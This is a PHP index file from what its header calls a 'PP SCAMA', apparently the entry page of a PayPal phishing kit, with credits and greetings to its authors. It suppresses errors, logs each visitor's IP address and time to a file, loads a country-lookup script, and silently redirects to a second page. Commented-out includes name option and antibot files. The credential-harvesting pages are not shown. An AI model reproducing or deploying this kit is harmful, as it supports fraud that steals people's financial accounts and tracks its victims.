<?php

/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- HaMza-x Ben  -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/

 // include "option.php";
// include "antibot.php";


include 'dznoob-country.php';


@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
date_default_timezone_set('GMT');

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);




?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">


<meta http-equiv="refresh" content="0;URL=index2.php" />

</head>
</html>
